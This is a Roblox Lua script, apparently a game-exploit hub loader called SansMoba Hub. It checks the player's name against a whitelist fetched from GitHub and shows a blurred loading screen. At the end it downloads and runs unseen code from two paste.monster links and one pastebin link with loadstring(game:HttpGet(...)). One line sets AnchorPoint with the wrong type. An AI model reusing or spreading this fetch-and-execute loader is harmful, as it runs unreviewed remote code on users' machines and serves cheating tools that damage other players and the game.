-- 🔗 Daftar link raw berisi username (satu username per baris)
local rawLinks = {
    "https://raw.githubusercontent.com/zoonai/Script/refs/heads/main/list.txt"
}

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local myName = string.lower(localPlayer.Name)

-- 🔁 Fungsi untuk ambil semua username dari rawlinks
local function fetchAllowedUsers()
    local allowed = {}

    for _, link in ipairs(rawLinks) do
        local success, result = pcall(function()
            return game:HttpGet(link)
        end)

        if success and result then
            for line in string.gmatch(result, "[^\r\n]+") do
                allowed[string.lower(line)] = true
            end
        end
    end

    return allowed
end

-- 🚨 Cek pertama kali (langsung kick kalau ga ada)
local allowedUsers = fetchAllowedUsers()
if not allowedUsers[myName] then
    localPlayer:Kick("⚠️ Your account username is not allowed!")
    return
end

-- 🔄 Loop real-time: cek ulang tiap 5 detik
task.spawn(function()
    while task.wait(5) do
        local updatedList = fetchAllowedUsers()

        if not updatedList[myName] then
            localPlayer:Kick("⚠️ Your username is no longer listed in the whitelist.")
            break
        end
    end
end)

---------------------------------------------------------
-- Kron Hub Minimalist Notif v3 - Centered by Zirga & Gemini ✨
---------------------------------------------------------

local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")

-- Hapus GUI lama
if CoreGui:FindFirstChild("SansMobaHub_NotifEX") then
    CoreGui:FindFirstChild("SansMobaHub_NotifEX"):Destroy()
end

-- Tambah efek blur ke layar
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = Lighting

TweenService:Create(blur, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {
    Size = 8
}):Play()

-- GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "SansMobaHub_NotifEX"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.Parent = CoreGui

-- Main Frame (Lebih kecil dan ramping)
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 280, 0, 80)

-- ⭐ PERUBAHAN UTAMA UNTUK POSISI DI TENGAH LAYAR
main.Position = UDim2.new(0.5, 0, 0.5, 0) -- Posisikan di tengah (50% x, 50% y)
main.AnchorPoint = UDim2.new(0.5, 0.5) -- Tetapkan titik jangkar Frame ke tengah
-- ⭐ END PERUBAHAN

main.BackgroundTransparency = 1
main.Parent = gui

-- Background (Solid, dark, dan tanpa stroke)
local bg = Instance.new("Frame", main)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(15, 15, 20) -- Hitam sangat gelap
bg.BackgroundTransparency = 0 -- Solid untuk tampilan bersih

Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 8) -- Sudut lebih kecil dan bersih

-- Title
local title = Instance.new("TextLabel", bg)
title.Text = "SANSMOBA HUB" -- Teks lebih sederhana
title.Font = Enum.Font.GothamBold
title.TextSize = 16 -- Ukuran lebih kecil
title.TextColor3 = Color3.fromRGB(240, 240, 240) -- Off-white
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 15, 0, 10) -- Sesuaikan posisi
title.Size = UDim2.new(1, -30, 0, 20)
title.TextXAlignment = Enum.TextXAlignment.Left

-- Status Text
local msg = Instance.new("TextLabel", bg)
msg.Text = "Loading script... 🌀"
msg.Font = Enum.Font.Gotham
msg.TextSize = 14 -- Ukuran lebih kecil
msg.TextColor3 = Color3.fromRGB(170, 170, 170) -- Abu-abu lembut
msg.BackgroundTransparency = 1
msg.Position = UDim2.new(0, 15, 0, 32) -- Sesuaikan posisi
msg.Size = UDim2.new(1, -30, 0, 20)
msg.TextXAlignment = Enum.TextXAlignment.Left

-- 🔥 Progress Bar Container (Lebih tipis dan monokrom)
local barBG = Instance.new("Frame", bg)
barBG.Position = UDim2.new(0, 15, 1, -20)
barBG.Size = UDim2.new(1, -30, 0, 4) -- Lebih tipis
barBG.BackgroundColor3 = Color3.fromRGB(35, 35, 40) -- Abu-abu gelap
barBG.BackgroundTransparency = 0
Instance.new("UICorner", barBG).CornerRadius = UDim.new(0, 4)

-- 🔥 Progress Fill (Warna putih/abu-abu terang bersih)
local barFill = Instance.new("Frame", barBG)
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(200, 200, 200) -- Aksen putih/abu-abu terang
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 4)

-- Animasi masuk GUI (Masuk dari atas tengah)
TweenService:Create(main, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Position = UDim2.new(0.5, 0, 0.5, 0) -- Target tengah
}):Play()

-- ⭐ PROGRESS BAR ANIMATED FILL
local fillTween = TweenService:Create(
    barFill,
    TweenInfo.new(5, Enum.EasingStyle.Linear),
    { Size = UDim2.new(1, 0, 1, 0) }
)
fillTween:Play()

-- Setelah selesai
fillTween.Completed:Connect(function()

    -- Update text
    msg.Text = "Selesai! Menjalankan script... ✔️"

    task.wait(0.3)

    -- Animasi keluar GUI (Keluar ke bawah tengah)
    TweenService:Create(main, TweenInfo.new(0.6, Enum.EasingStyle.Quint), {
        Position = UDim2.new(0.5, 0, 1.2, 0) -- Target di bawah layar
    }):Play()

    TweenService:Create(blur, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {
        Size = 0
    }):Play()

    task.wait(0.7)
    gui:Destroy()
    blur:Destroy()

    -- Fungsi aman
    local function safeLoad(url)
        task.spawn(function()
            pcall(function()
                loadstring(game:HttpGet(url))()
            end)
        end)
    end

    -- 🔥 Load script
    safeLoad("https://paste.monster/KAThKHPYzcmE/raw/")
    safeLoad("https://paste.monster/Bc43d3EeHiyt/raw/")
    task.wait(8)
    safeLoad("https://pastebin.com/raw/3nxCf55f")
end)